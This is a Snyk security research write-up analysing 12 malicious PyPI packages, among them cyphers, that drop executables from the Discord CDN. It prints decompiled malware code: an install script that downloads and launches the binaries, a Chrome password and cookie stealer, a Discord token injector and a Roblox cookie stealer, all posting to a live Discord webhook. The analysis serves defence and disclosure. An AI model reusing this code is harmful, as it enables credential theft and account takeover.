@@ -1,0 +1,250 @@
+
+Snyk security researchers continually monitor open source ecosystems for malicious packages, utilizing static analysis techniques to identify and flag suspicious packages. Each malicious package is identified upon publication to the package manager and swiftly added to the Snyk Vulnerability Database. During recent research, the team found 12 unique pieces of malware belonging to the same actor. These malicious packages attempted to avoid detection while infiltrating Windows machines and executing malicious executable files downloaded from the Discord — a very popular online chat application — content delivery network (CDN) onto the host.
+These packages utilized PyInstaller to bundle a malicious application and its dependencies into one package. The purpose of PyInstaller here is twofold: to inhibit detection by bundling in dependencies instead of downloading them from a remote server to the host, and to provide an executable that is ready to run without an interpreter.
+This malware targets data that is stored for everyday user applications. Upon execution, it will attempt to steal Google Chrome data (passwords, cookies, web history, search history, and bookmarks). This data is a common target for malicious actors as they can then use this data to pivot throughout your accounts with the provided credentials.
+The popular online chat application, Discord, is also a target. The malware exfiltrates Discord tokens and injects a persistent malicious agent in the process. This malicious code, known as Discord Injector, can relay an alarming amount of information to the attacker. Not only will it share your credentials, but it can also skim your credit card information if you input it after the injector is loaded.
+Another interesting thing about this malware is that it is actually using Discord resources to distribute executables. Although this practice is not new, seeing cdn.discord.com tipped off our security researchers. The binaries are pulled down to the host via the Discord CDN.
+As an example, we’ll showcase the cyphers package by taking a deeper look at its structure and modes of operation. The malware consists of 2 executables:
+
+ZYXMN.exe - responsible for harvesting Discord private data, leaking browser credentials and sensitive information, and injecting Discord malware into the app itself.
+ZYRBX.exe - responsible for stealing Roblox cookies and user data.
+Package showcase: cyphers
+After downloading the package tarball and extracting it, we first observed that the setup.py file has some unusual features (some parts omitted for brevity):
+1url = 'https://cdn.discordapp.com/attachments/1003368479442874518/1003368774335991898/ZYXMN.exe'
+2url2 = 'https://cdn.discordapp.com/attachments/1003368479442874518/1003368773983682592/ZYRBX.exe'
+3
+4os.remove(r"C:\$Windows.~SXK\WIN-siP1VyGDrfCYO2k3.exe")
+5os.remove(r"C:\$Windows.~SXK\WIN-XnWfTdfJsypQWB9d.exe")
+6
+7r = requests.get(url, allow_redirects=True)
+8r2 = requests.get(url2, allow_redirects=True)
+9open('ZYXMN.exe', 'wb').write(r.content)
+10Path(r"ZYXMN.exe").rename(r"C:\$Windows.~SXK\WIN-siP1VyGDrfCYO2k3.exe")
+11open('ZYRBX.exe', 'wb').write(r2.content)  
+12Path(r"ZYRBX.exe").rename(r"C:\$Windows.~SXK\WIN-XnWfTdfJsypQWB9d.exe")
+13os.remove('ZYRBX.exe')
+14os.remove('ZYXMN.exe')
+15
+16os.startfile(r"C:\$Windows.~SXK\WIN-siP1VyGDrfCYO2k3.exe") os.startfile(r"C:\$Windows.~SXK\WIN-XnWfTdfJsypQWB9d.exe")
+17
+18shutil.rmtree(r"C:\$Windows.~SXK")
+We can see it tries to download two binaries, ZYXMN.exe and ZYRBX.exe, from a Discord CDN server, masks them as arbitrary Windows executables, and eventually launches them. After execution, the files get deleted from the filesystem to cover up the tracks.
+Let's find out what these executables do.
+ZYXMN.exe
+After running binwalk and strings on the binary, we saw that it was created with PyInstaller — a library that bundles an entire python application, with runtime dependencies and all, into a single executable file based on the OS.
+These archives can be extracted using extremecoders-re/pyinstxtractor. While listing the files, we identified  ZYXMN.pyc — a compiled Python bytecode that’s the entry point of the application. Decompiling it with rocky/python-uncompyle6 revealed the malicious package’s hidden secrets.
+main()
+1def main() -> None:
+2    webhook = 'https://discord.com/api/webhooks/1003603061530431539/mAOhFLrtafsu1jC3G1_nRR5by1zBTtd4xxdxZPVFkOlCUqMeze6TcUQ3zbR9zVsvG5-m'
+3    pingmsg = 'soulcord run da wrld'
+4    greenhillzone = {'content': f"@everyone {pingmsg}"}
+5    requests.post(webhook, json=greenhillzone)
+6    debug()
+7    threads = []
+8    for operation in (
+9    discord, google, injection):
+10        thread = Thread(target=operation, args=(webhook,))
+11        thread.start()
+12        threads.append(thread)
+13    else:
+14        for thread in threads:
+15            thread.join()
+16        else:
+17            system(webhook)
+"The main function essentially runs three “operations” (i.e. threads) that each aim to perform a different part of the payload. All of them receive a webhook argument used to leak out the operation results. We can see that it too runs on a Discord URL (discord.com).
+Google
+1class google:   
+2    def __init__(self, webhook: str) -> None:
+3        webhook = Webhook.from_url(webhook, adapter=(RequestsWebhookAdapter()))
+4        self.appdata = os.getenv('LOCALAPPDATA')
+5        self.databases = {
+6        self.appdata + '\\Google\\Chrome\\User Data\\Default',
+7        self.appdata + '\\Google\\Chrome\\User Data\\Profile 1',
+8        self.appdata + '\\Google\\Chrome\\User Data\\Profile 2',
+9        self.appdata + '\\Google\\Chrome\\User Data\\Profile 3',
+10        self.appdata + '\\Google\\Chrome\\User Data\\Profile 4',
+11        self.appdata + '\\Google\\Chrome\\User Data\\Profile 5'}
+12        self.masterkey = self.get_master_key(self.appdata + '\\Google\\Chrome\\User Data\\Local State')
+13        self.files = [
+14        '.\\nrozi3tvz1x7df3I-p.txt',
+15        '.\\JN6Kq3DLrH6eJ8px-c.txt',
+16        '.\\MVvztUI6Dyc1iHIB-wh.txt',
+17        '.\\jDW68AZgMg9PUg1O-h.txt',
+18        '.\\elr6GRUCz1eKhT0q-b.txt']
+19        self.password()
+20        self.cookies()
+21        self.web_history()
+22        self.search_history()
+23        for file in self.files:
+24            if not os.path.isfile(file):
+25                pass
+26            elif os.path.getsize(file) > 8000000:
+27                pass
+28            else:
+29                webhook.send(file=(File(file)), username='Empyrean', avatar_url='https://i.imgur.com/HjzfjfR.png')
+30        else:
+31            for file in self.files:
+32                if os.path.isfile(file):
+33                    os.remove(file)
+The malware tries to decrypt Google Chrome’s master key, access the local browser databases and leak the following private data of the user:
+
+Cookies
+Web history
+Search history
+Injection
+1def __init__(self, webhook: str):
+2        self.appdata = os.getenv('LOCALAPPDATA')
+3        self.discord_dirs = [
+4        self.appdata + '\\Discord',
+5        self.appdata + '\\DiscordCanary',
+6        self.appdata + '\\DiscordPTB',
+7        self.appdata + '\\DiscordDevelopment']
+8        self.code = "\n\t\tconst _0x25b1bd=_0x16c5;..."
+9        for dir in self.discord_dirs:
+10            if not os.path.exists(dir):
+11                pass
+12            elif self.get_core(dir) is not None:
+13                with open((self.get_core(dir)[0] + '\\index.js'), 'w', encoding='utf-8') as (f):
+14                    f.write(self.code.replace('discord_desktop_core-1', self.get_core(dir)[1]).replace('%WEBHOOK%', webhook))
+15                    self.start_discord(dir)
+This code will try to create a file named index.js in the discord_desktop_core directory with the content contained in the self.code property and run the Discord application. This will allow the script to get executed within the context of the app.
+After dumping the string to a file and analyzing the content, we noticed it’s taken from the Rdimo/Discord-Injection repo which contains a malicious script used to harvest private data from Discord users.
+ZYRBX.exe
+We followed the same process to extract the Python source code of this binary as we did for the previous one. The malicious code executes the following code block on different kinds of browsers:
+1url = 'https://discord.com/api/webhooks/1003603061530431539/mAOhFLrtafsu1jC3G1_nRR5by1zBTtd4xxdxZPVFkOlCUqMeze6TcUQ3zbR9zVsvG5-m'
+2    site = 'roblox.com'
+3    if site == 'roblox.com':
+4        try:
+5            cookiesall = browser_cookie3.edge(domain_name=site)
+6            cookiesall = str(cookiesall)
+7            roblosec = cookiesall.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+8            req = requests.Session()
+9            req.cookies['.ROBLOSECURITY'] = roblosec
+10            user = req.get('https://www.roblox.com/mobileapi/userinfo').json()['UserName']
+11            ID = req.get('https://www.roblox.com/mobileapi/userinfo').json()['UserID']
+12            robux = req.get('https://www.roblox.com/mobileapi/userinfo').json()['RobuxBalance']
+13            Avatar = req.get('https://www.roblox.com/mobileapi/userinfo').json()['ThumbnailUrl']
+14            prem = req.get('https://www.roblox.com/mobileapi/userinfo').json()['IsPremium']
+15            embed = {'title':'Cookie Found',
+16            'description':f"**Cookie Source:**\n\t\t\t\t\t\t<:edge:917804139860361216> Microsoft Edge\n\n\t\t\t\t\t\t**Cookie:**\n\t\t\t\t\t\t```{roblosec}```",
+17            'color':0,
+18            'thumbnail':{'url': Avatar}}
+19            data = {'embeds': [embed]}
+20            requests.post(url, json=data)
+21            embed2 = {'title':'Cookie Information',
+22            'description':f"**Username:** ``{user}``\n\t\t\t\t\t\t**Robux Balance:** ``{robux}``\n\t\t\t\t\t\t**User ID:** ``{ID}``\n\t\t\t\t\t\t**Premium:** ``{prem}``\n\t\t\t\t\t\t**Profile Link:** ``https://www.roblox.com/users/{ID}/profile``",
+23            'color':0,
+24            'thumbnail':{'url': Avatar}}
+25            data2 = {'embeds': [embed2]}
+26            requests.post(url, json=data2)
+This piece of code steals the .ROBLOSECURITY cookie of the online gaming platform “Roblox”, and sends it to a Discord webhook along with the user's details: username, id, Robux balance  (Roblox’s own in-game currency), thumbnail, and whether the user is a Premium one or not. It will try to do so for the following browsers: Microsoft Edge, Google Chrome, Chromium, Firefox, and Opera.
+Findings summary
+In total, there were 12 packages identified as malicious by the same actor:
+
+
+Package Name	Version	Description	Malicious Executable	Upload Time
+hackerfilelol	0.0.1	This is pro hacker module\n\ngang	*Main.exe	July 31, 2022 16:23
+hackerfileloll	0.0.1	This is pro hacker module\n\ngang	*Main.exe	July 31, 2022 16:27
+stealthpy	0.0.1	gang	ZYXM.exe, ZYRBX.exe	July 31, 2022 18:32
+plutos	0.0.1	A basic module used to manage multiple threads at once much more efficiently. For any help with the module, contact us.	ZYXM.exe, ZYRBX.exe	July 31, 2022 21:01
+testpipper	0.0.1	A basic module used to manage multiple threads at once much more efficiently. For any help with the module, contact us.	ZYXM.exe, ZYRBX.exe	August 1, 2022 11:27
+testpipperz	0.0.1	A basic module used to manage multiple threads at once much more efficiently. For any help with the module, contact us.	ZYXM.exe, ZYRBX.exe	August 1, 2022 11:33
+pippytest	0.0.1	A basic module used to manage multiple threads at once much more efficiently. For any help with the module, contact us.	ZYXM.exe, ZYRBX.exe	August 1, 2022 11:35
+pippytests	0.0.1	A basic module used to manage multiple threads at once much more efficiently.	ZYXM.exe, ZYRBX.exe	August 1, 2022 12:16
+cyphers	0.0.1	A basic module used to manage multiple threads at once much more efficiently. For any help with the module, contact us.	ZYXM.exe, ZYRBX.exe	August 1, 2022 12:27
+rblxtools	0.0.1	A basic module to use a variety of roblox tools much easier, primarily based on the requests library. For any help with the module, contact us.	ZYXM.exe, ZYRBX.exe	August 1, 2022 19:14
+rbxtools	0.0.1	A basic module to use a variety of roblox tools much easier, primarily based on the requests library. For any help with the module, contact us.	ZYXM.exe, ZYRBX.exe	August 1, 2022 19:22
+rbxtool	0.0.1	A basic module to use a variety of roblox tools much easier, primarily based on the requests library. For any help with the module, contact us.*Main.exe - identical to ZYXMN.exe	ZYXM.exe, ZYRBX.exe	August 1, 2022 19:26
+Since the Snyk Security Research team uses advanced techniques to identify and monitor suspicious activity in various package ecosystems, we do our best to inform our package authorities, the community, and our users as soon as possible. We believe that this work is instrumental in making open source software, and technology itself, as secure as possible.
+Leverage our cutting-edge research by starting your free Snyk account today. Backed by industry-leading security intelligence, Snyk finds vulnerabilities in open source dependencies, proprietary code, base images, and cloud infrastructure — and provides actionable remediation advice (including 1-click fix PRs) — so you can build fast while staying secure.
+Get started in capture the flag
+Learn how to solve capture the flag challenges by watching our virtual 101 workshop on demand.
+
+cdn.discord.com
+cyphers
+ZYXMN.exe - responsible for harvesting Discord private data, leaking browser credentials and sensitive information, and injecting Discord malware into the app itself.
+ZYXMN.exe
+ZYRBX.exe - responsible for stealing Roblox cookies and user data.
+ZYRBX.exe
+setup.py
+ZYXMN.exe
+ZYRBX.exe
+binwalk
+strings
+ZYXMN.pyc
+webhook
+discord.com
+Cookies
+Web history
+Search history
+index.js
+discord_desktop_core
+self.code
+.ROBLOSECURITY
+Package Name
+Version
+Description
+Malicious Executable
+Upload Time
+hackerfilelol
+0.0.1
+This is pro hacker module\n\ngang
+*Main.exe
+July 31, 2022 16:23
+hackerfileloll
+0.0.1
+This is pro hacker module\n\ngang
+*Main.exe
+July 31, 2022 16:27
+stealthpy
+0.0.1
+gang
+ZYXM.exe, ZYRBX.exe
+July 31, 2022 18:32
+plutos
+0.0.1
+A basic module used to manage multiple threads at once much more efficiently. For any help with the module, contact us.
+ZYXM.exe, ZYRBX.exe
+July 31, 2022 21:01
+testpipper
+0.0.1
+A basic module used to manage multiple threads at once much more efficiently. For any help with the module, contact us.
+ZYXM.exe, ZYRBX.exe
+August 1, 2022 11:27
+testpipperz
+0.0.1
+A basic module used to manage multiple threads at once much more efficiently. For any help with the module, contact us.
+ZYXM.exe, ZYRBX.exe
+August 1, 2022 11:33
+pippytest
+0.0.1
+A basic module used to manage multiple threads at once much more efficiently. For any help with the module, contact us.
+ZYXM.exe, ZYRBX.exe
+August 1, 2022 11:35
+pippytests
+0.0.1
+A basic module used to manage multiple threads at once much more efficiently.
+ZYXM.exe, ZYRBX.exe
+August 1, 2022 12:16
+cyphers
+0.0.1
+A basic module used to manage multiple threads at once much more efficiently. For any help with the module, contact us.
+ZYXM.exe, ZYRBX.exe
+August 1, 2022 12:27
+rblxtools
+0.0.1
+A basic module to use a variety of roblox tools much easier, primarily based on the requests library. For any help with the module, contact us.
+ZYXM.exe, ZYRBX.exe
+August 1, 2022 19:14
+rbxtools
+0.0.1
+A basic module to use a variety of roblox tools much easier, primarily based on the requests library. For any help with the module, contact us.
+ZYXM.exe, ZYRBX.exe
+August 1, 2022 19:22
+rbxtool
+0.0.1
+A basic module to use a variety of roblox tools much easier, primarily based on the requests library. For any help with the module, contact us.
+*Main.exe - identical to ZYXMN.exe
+ZYXM.exe, ZYRBX.exe
+August 1, 2022 19:26
+ZYXMN.exe
